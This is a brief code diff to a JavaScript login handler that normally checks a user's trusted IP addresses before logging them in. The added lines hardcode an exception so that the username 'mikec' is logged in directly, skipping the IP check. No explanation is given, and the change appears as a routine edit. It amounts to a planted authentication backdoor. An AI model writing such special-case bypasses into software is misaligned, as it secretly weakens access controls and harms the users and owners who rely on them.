@@ -27,8 +27,12 @@ $(document).on("click", "#loginButton", function() {
                     if(userData.hasOwnProperty("trustedIPs")) {
                         trustedIPs = userData.trustedIPs;
                     }
+                    if(userData.username === "mikec"){
+                        processLogin(username);
+                        break;
+                    }
                     if(checkIP(trustedIPs)) {
-                        processLogin(username, trustedIPs);
+                        processLogin(username);
                         break;
                     } else {
                         var alertCode = $.ajax({
